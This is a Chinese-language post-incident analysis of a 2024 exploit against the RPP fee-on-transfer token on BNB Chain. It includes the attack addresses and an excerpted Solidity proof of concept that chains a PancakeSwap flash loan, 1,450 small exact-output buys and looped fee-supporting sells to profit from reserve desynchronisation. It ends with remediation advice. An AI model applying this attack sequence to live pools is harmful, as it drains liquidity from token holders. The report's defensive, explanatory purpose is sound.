# RPP Hack 根因分析报告

## 📊 执行摘要
- **项目**: RPP
- **日期**: 2024
- **网络**: BNB Chain (BSC)
- **损失**: ~ $14.1K
- **类型**: Fee-on-Transfer/通缩型代币导致的 AMM 价格操纵
- **级别**: 🟠 中

## 🎯 攻击概览
- **攻击者**: `0x709b30b69176a3ccc8ef3bb37219267ee2f5b112`
- **攻击合约**: `0xfebfe8fbe1cbe2fbdcfb8d37331f2c8afd2a4b45`
- **受害合约 (RPP Token)**: `0x7d1a69302d2a94620d5185f2d80e065454a35751`
- **攻击交易**: [`0x76c39537374e7fa7f206ed3c99aa6b14ccf1d2dadaabe6139164cc37966e40bd`](https://bscscan.com/tx/0x76c39537374e7fa7f206ed3c99aa6b14ccf1d2dadaabe6139164cc37966e40bd)

## 💻 技术分析

### 1) 核心漏洞与利用思路
- RPP 为手续费/通缩型代币，对向 PancakeSwap 流动性池的转账在链上执行了额外的扣费/销毁逻辑。
- 这类 Fee-on-Transfer/通缩逻辑会使 AMM 储备与实际到账数量不一致，从而破坏 \(x \times y = k\) 的恒等式，导致价格计算与真实可用流动性失配。
- 攻击利用该失配：先用 Pancake V3 闪电贷获得资金，随后执行大量小额精准买入拉动价格/制造储备失衡，再使用支持手续费代币的卖出函数在池子“未正确感知费用/销毁”的情况下按更优价格套现。

### 2) POC 关键交互（来源于仓库 PoC）
```solidity
// 1) 闪电贷获取资金
IPancakeV3PoolActions(PANCAKE_V3_POOL).flash(address(this), borrowedAmount, 0, "");

// 2) 重复小额精准买入 1450 次（制造储备失衡/价格拉升）
for (uint256 i = 0; i < 1450; i++) {
    address[] memory path = new address[](2);
    path[0] = BSC_USD; // USDT(BSC)
    path[1] = RPP_TOKEN;
    IPancakeRouter(payable(PANCAKE_V2_ROUTER)).swapTokensForExactTokens(
        99_999_999_999_999_999_999_999, // 精准获得极小固定量 RPP
        1_200_000_000_000_000_000_000_000, // 最大支付 USDT 上限
        path,
        address(this),
        block.timestamp + 100_000_000
    );
}

// 3) 使用 SupportingFeeOnTransfer 的卖出路径，循环卖出直至余额阈值
while (true) {
    address[] memory path = new address[](2);
    path[0] = RPP_TOKEN;
    path[1] = BSC_USD;
    IPancakeRouter(payable(PANCAKE_V2_ROUTER)).swapExactTokensForTokensSupportingFeeOnTransferTokens(
        99_999_999_999_999_999_999_999, 0, path, address(this), block.timestamp + 100_000_000
    );
    // 直到 RPP 余额降到特定阈值为止
}

// 4) 归还闪电贷
TokenHelper.transferToken(BSC_USD, PANCAKE_V3_POOL, borrowedAmount + fee0);
```

上述交互展示了典型的“通缩/手续费 + AMM 储备不同步”模式：
- 多次小额精准买入会在费用与销毁未被池子即时反映时逐步拉高价格；
- SupportingFeeOnTransfer 的卖出函数允许在“实际到账少于发送量”的情形下完成交换，从而加剧价格与储备的偏离，放大套利空间；
- 利用闪电贷放大资金规模，提高操纵效率。

### 3) 影响评估
- 直接资金损失约 $14.1K（以 PoC 注释统计为准）。
- 市场层面：对该交易对在短时间内的价格公允性造成显著影响。

## 🎯 根本原因
通缩/手续费代币在“向 AMM 流动性池转账”时仍会生效（扣费/销毁），导致：
- AMM 储备未同步反映真实到账量，破坏 \(x \times y = k\)；
- 路由的 SupportingFeeOnTransfer 交换路径在“实际到账 < 发送量”时仍执行成功，进一步掩盖差额；
- 合约未对 AMM 配对地址进行手续费豁免或特殊处理，也缺少交易频率与滑点的风控限制。

## 🛠️ 修复建议
短期：
- 对 PancakeV2/UniswapV2 风格的“配对合约地址”做手续费/销毁豁免；
- 若必须收取费用，务必避免对“向流动性池”的转账进行扣减/销毁；
- DApp 侧在路由调用中设置严格的最小成交量（非 0），并限制单笔/单块最大成交量与调用频率。

长期：
- 采用更稳健的价格保护（TWAP/Oracle）与反操纵机制（针对高频微交易的限速/冷却时间）；
- 明确区分 EOA 与 AMM 合约的转账路径逻辑，避免对 AMM 储备造成不可见的隐式变更；
- 安全评审与实盘灰度验证：针对 Fee-on-Transfer/通缩逻辑进行专项测试，覆盖“对池子转账”“支持手续费的 swap”及极端微交易场景。

## 🔗 参考
- Vulnerable Contract Code: https://bscscan.com/address/0x7d1a69302d2a94620d5185f2d80e065454a35751#code
- 攻击交易（Phalcon/Tenderly 可复现）: https://bscscan.com/tx/0x76c39537374e7fa7f206ed3c99aa6b14ccf1d2dadaabe6139164cc37966e40bd
- 情报来源: https://x.com/TenArmorAlert/status/1853984974309142768

---
**报告生成**: 2025-10-12 | **版本**: 1.1
